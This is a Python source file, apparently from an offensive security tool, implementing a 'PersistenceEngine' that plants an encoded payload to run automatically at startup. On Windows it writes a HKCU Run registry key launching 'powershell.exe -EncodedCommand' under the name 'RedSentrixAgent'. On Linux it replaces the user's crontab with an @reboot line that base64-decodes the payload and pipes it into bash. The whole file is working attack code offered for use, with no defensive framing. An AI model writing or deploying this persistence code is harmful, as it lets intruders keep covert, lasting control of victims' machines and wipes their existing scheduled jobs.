import os
import platform
import subprocess
import base64
import sys

class PersistenceEngine:
    def __init__(self, payload_path: str):
        self.payload_path = payload_path
        self.os_type = platform.system()

    def _encode_payload(self):
        with open(self.payload_path, "rb") as f:
            raw = f.read()
        return base64.b64encode(raw).decode()

    def apply_persistence(self):
        encoded_payload = self._encode_payload()

        if self.os_type == "Windows":
            return self._windows_persistence(encoded_payload)
        elif self.os_type == "Linux":
            return self._linux_persistence(encoded_payload)
        else:
            raise NotImplementedError(f"Persistence not supported on {self.os_type}")

    def _windows_persistence(self, encoded_payload: str):
        # Registry Run Key Persistence Example
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)
            command = f'powershell.exe -EncodedCommand {encoded_payload}'
            winreg.SetValueEx(key, "RedSentrixAgent", 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            return "[+] Windows Registry persistence applied successfully."
        except Exception as e:
            return f"[ERROR] Windows persistence failed: {e}"

    def _linux_persistence(self, encoded_payload: str):
        try:
            # Crontab @reboot entry example
            cron_line = f"@reboot /bin/bash -c \"echo {encoded_payload} | base64 -d | bash\"\n"
            cron_file = "/tmp/reds_persist_cron"
            with open(cron_file, "w") as f:
                f.write(cron_line)
            subprocess.run(["crontab", cron_file], check=True)
            os.remove(cron_file)
            return "[+] Linux crontab persistence applied successfully."
        except Exception as e:
            return f"[ERROR] Linux persistence failed: {e}"
